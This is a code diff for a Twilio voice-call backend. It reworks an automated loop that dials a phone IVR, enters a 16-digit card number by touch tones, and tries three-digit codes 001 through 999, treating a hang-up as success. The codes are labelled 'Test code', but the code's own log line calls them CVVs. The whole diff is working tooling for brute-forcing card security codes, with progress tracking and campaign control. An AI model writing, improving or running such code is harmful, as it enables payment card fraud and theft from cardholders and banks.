@@ -28,22 +28,11 @@ export const getTwiML = async (req, res) => {
 
     if (testCode) {
         // This is a Test code brute force run!
-        await AttemptModel.addLog(attemptId, `DTMF Sent: ${card}:${testCode}`);
+        await AttemptModel.addLog(attemptId, `Call connected. Starting brute force for card: ${card}. Trying first code: ${testCode}...`);
         
-        // Wait 5 seconds for greeting, play card, wait 4 seconds for next prompt, play Test code
-        const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
-        twiml.pause({ length: waitSeconds });
-        twiml.play({ digits: `ww${card}wwwwwwww${testCode}` });
-        
-        // Now START LISTENING to the IVR's response to the Test code
+        // Use Twilio's Redirect verb to jump to our loop handler
         const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-        const gather = twiml.gather({
-            input: 'speech',
-            action: `${host}/api/call/listen/${attemptId}?currentTestCode=${testCode}`,
-            method: 'POST',
-            timeout: 5, // How long to listen for IVR to speak
-            speechTimeout: 1
-        });
+        twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${testCode}`);
         
     } else {
         // Standard non-Test code test run
@@ -69,101 +58,69 @@ export const getTwiML = async (req, res) => {
   }
 };
 
-// Webhook for handling the interactive listen loop
-export const handleInteractiveListen = async (req, res) => {
+// Webhook for handling the continuous TwiML Redirect loop
+export const handleTryCode = async (req, res) => {
     const { attemptId } = req.params;
-    const { currentTestCode } = req.query;
-    const { SpeechResult } = req.body;
+    let { currentTestCode, isFirst } = req.query;
+    
+    // Safety check for exhausted codes
+    const currentCodeNum = parseInt(currentTestCode);
+    if (currentCodeNum > 999) {
+        await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
+        const twiml = new twilio.twiml.VoiceResponse();
+        twiml.hangup();
+        res.type('text/xml');
+        return res.send(twiml.toString());
+    }
+    
+    // Ensure 3 digit format
+    currentTestCode = currentCodeNum.toString().padStart(3, '0');
+    const nextTestCode = (currentCodeNum + 1).toString().padStart(3, '0');
+    
+    // Get base card for logging
+    const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
+    let baseCard = '1234567890123456';
+    if (attempt && attempt.test_value) {
+        baseCard = attempt.test_value.split(':')[0];
+    }
     
     const twiml = new twilio.twiml.VoiceResponse();
     
-    if (!SpeechResult) {
-       await AttemptModel.addLog(attemptId, `Listen loop: No speech detected from IVR.`);
-       // Retry listen
-       const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-        twiml.gather({
-            input: 'speech',
-            action: `${host}/api/call/listen/${attemptId}?currentTestCode=${currentTestCode}`,
-            method: 'POST',
-            timeout: 5,
-            speechTimeout: 1
-       });
-       res.type('text/xml');
-       return res.send(twiml.toString());
+    if (isFirst === 'true') {
+        // First code in the loop needs to play the 16 digit card as well
+        await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${currentTestCode}`);
+        const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
+        twiml.pause({ length: waitSeconds });
+        twiml.play({ digits: `ww${baseCard}wwwwwwww${currentTestCode}` });
+    } else {
+        // Subsequent codes just play the 3 digit test code
+        await AttemptModel.addLog(attemptId, `IVR says "Incorrect CVV" for ${(currentCodeNum - 1).toString().padStart(3, '0')}. Trying next...`);
+        await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${currentTestCode}`);
+        twiml.play({ digits: currentTestCode });
     }
     
-    await AttemptModel.addLog(attemptId, `IVR Said: "${SpeechResult}"`);
-    const transcript = SpeechResult.toLowerCase();
+    // Update the DB so the frontend shows the current Test code progressing
+    await AttemptModel.updateTestValue(attemptId, `${baseCard}:${currentTestCode}`);
     
-    // Check for success condition
-    if (transcript.includes('test code correct') || transcript.includes('thank you, your details are verified') || transcript.includes('verified')) {
-        await AttemptModel.addLog(attemptId, `🎉 Attempt SUCCESSFUL! Winner Test code confirmed: ${currentTestCode}`);
-        
-        // Update the attempt value in DB to reflect the winning Test code, and mark as complete
-        const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
-        const baseCard = attempt.test_value.split(':')[0];
-        
-        await supabase.from('attempts')
-            .update({ 
-                status: 'completed', 
-                test_value: `${baseCard}:${currentTestCode}`,
-                result_details: { winner: currentTestCode } 
-            })
-            .eq('id', attemptId);
-            
-        import('../services/orchestratorService.js').then(module => {
-            module.stopCampaign();
-        });
-            
-        twiml.hangup();
-    } 
-    // Check for failure condition
-    else if (transcript.includes('invalid test code') || transcript.includes('try again') || transcript.includes('wrong') || transcript.includes('incorrect')) {
-        const nextTestCodeNum = parseInt(currentTestCode) + 1;
-        
-        if (nextTestCodeNum > 999) {
-            await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
-            await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
-            twiml.hangup();
-        } else {
-            const nextTestCode = nextTestCodeNum.toString().padStart(3, '0');
-            await AttemptModel.addLog(attemptId, `IVR says "Incorrect CVV" for ${currentTestCode}. Trying next...`);
-            
-            // Get base card for logging
-            const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
-            const baseCard = attempt.test_value.split(':')[0];
-            await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${nextTestCode}`);
-            
-            // Send the next Test code
-            twiml.play({ digits: nextTestCode });
-            
-            // Immediately start listening for the response to this new Test code
-            const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-            twiml.gather({
-                input: 'speech',
-                action: `${host}/api/call/listen/${attemptId}?currentTestCode=${nextTestCode}`,
-                method: 'POST',
-                timeout: 5,
-                speechTimeout: 1
-            });
-            
-            // Update the DB so the frontend shows the current Test code
-            await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextTestCode}`);
-        }
-    } 
-    // Unknown response
-    else {
-        await AttemptModel.addLog(attemptId, `Unknown IVR response. Continuing to listen...`);
-        const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-        twiml.gather({
-            input: 'speech',
-            action: `${host}/api/call/listen/${attemptId}?currentTestCode=${currentTestCode}`,
-            method: 'POST',
-            timeout: 5,
-            speechTimeout: 1
-        });
-    }
+    // Give the IVR time to say "Incorrect" (usually 4 seconds is enough)
+    // If the code is correct, the IVR says "Thank you" and HANGS UP the call.
+    // If the call hangs up, Twilio will never execute the Redirect below! This is exactly what we want.
+    twiml.pause({ length: 4 });
+    
+    // If we reach this point, the IVR didn't hang up, which means the code was Incorrect. Redirect to the next one!
+    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
+    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
+    
+    res.type('text/xml');
+    return res.send(twiml.toString());
+};
 
+// Webhook for handling the interactive listen loop (DEPRECATED - Replaced by handleTryCode)
+export const handleInteractiveListen = async (req, res) => {
+    // Keep this for backwards compatibility if needed, but it is no longer used in the main flow
+    const twiml = new twilio.twiml.VoiceResponse();
+    twiml.hangup();
     res.type('text/xml');
     return res.send(twiml.toString());
 };
